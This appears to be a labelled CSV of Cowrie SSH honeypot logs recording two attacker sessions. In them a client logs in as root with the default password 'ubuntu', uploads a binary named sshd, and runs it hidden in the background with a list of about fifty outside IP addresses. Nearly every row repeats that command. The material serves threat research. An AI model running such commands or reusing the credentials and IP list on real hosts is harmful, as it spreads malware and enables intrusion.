,event,session_id,session,labels
10,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:53:22.689957Z"", ""version"": ""SSH-2.0-Go""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
11,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""98ddc5604ef6a1006a2b49a58759fbe6"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha1""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:53:22.716126Z""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
12,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/ubuntu] succeeded"", ""password"": ""ubuntu"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:53:22.800616Z"", ""username"": ""root""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
13,"{""eventid"": ""cowrie.session.file_upload"", ""filename"": ""sshd"", ""message"": ""SFTP Uploaded file \""sshd\"" to var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""outfile"": ""var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:54:15.429171Z""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
14,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:54:15.722391Z""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
15,"{""eventid"": ""cowrie.command.input"", ""input"": ""chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &"", ""message"": ""CMD: chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:54:15.723075Z""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
16,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711"", ""size"": 136.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:54:15.751194Z"", ""ttylog"": ""var/lib/cowrie/tty/9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
17,"{""duration"": ""53.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 53.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T23:54:15.752099Z""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
18,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:1310 (10.42.6.15:2222) [session: 1e3a1a957063]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 1310.0, ""timestamp"": ""2025-08-07T14:43:44.423407Z""}",1e3a1a957063,chmod +x ./.5992002807422112271/sshd;nohup ./.5992002807422112271/sshd 154.90.55.13 124.222.68.65 101.36.228.201 43.167.236.203 152.32.133.47 119.18.48.125 47.122.51.245 193.34.212.145 155.94.170.162 66.206.224.115 222.187.215.194 114.231.77.98 49.143.252.53 79.120.74.12 84.247.154.56 67.227.214.45 117.149.247.146 170.84.39.236 101.91.181.235 118.121.197.69 103.145.145.78 111.12.131.236 62.171.162.142 103.232.21.226 112.171.213.120 36.151.251.47 178.128.253.94 202.129.205.122 45.15.168.245 36.163.199.22 36.163.199.18 180.163.61.238 46.235.84.183 38.224.226.246 117.173.76.160 221.2.109.10 157.255.155.179 188.166.211.175 14.103.158.69 103.85.84.176 31.47.51.84 153.124.134.62 103.228.170.105 36.156.186.114 31.210.64.67 43.139.160.130 8.213.227.78 115.231.181.61 192.241.228.126 138.197.163.192 47.94.158.98 &;,"['Execution', 'Initial Access']"
19,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T14:43:44.425132Z"", ""version"": ""SSH-2.0-Go""}",1e3a1a957063,chmod +x ./.5992002807422112271/sshd;nohup ./.5992002807422112271/sshd 154.90.55.13 124.222.68.65 101.36.228.201 43.167.236.203 152.32.133.47 119.18.48.125 47.122.51.245 193.34.212.145 155.94.170.162 66.206.224.115 222.187.215.194 114.231.77.98 49.143.252.53 79.120.74.12 84.247.154.56 67.227.214.45 117.149.247.146 170.84.39.236 101.91.181.235 118.121.197.69 103.145.145.78 111.12.131.236 62.171.162.142 103.232.21.226 112.171.213.120 36.151.251.47 178.128.253.94 202.129.205.122 45.15.168.245 36.163.199.22 36.163.199.18 180.163.61.238 46.235.84.183 38.224.226.246 117.173.76.160 221.2.109.10 157.255.155.179 188.166.211.175 14.103.158.69 103.85.84.176 31.47.51.84 153.124.134.62 103.228.170.105 36.156.186.114 31.210.64.67 43.139.160.130 8.213.227.78 115.231.181.61 192.241.228.126 138.197.163.192 47.94.158.98 &;,"['Execution', 'Initial Access']"
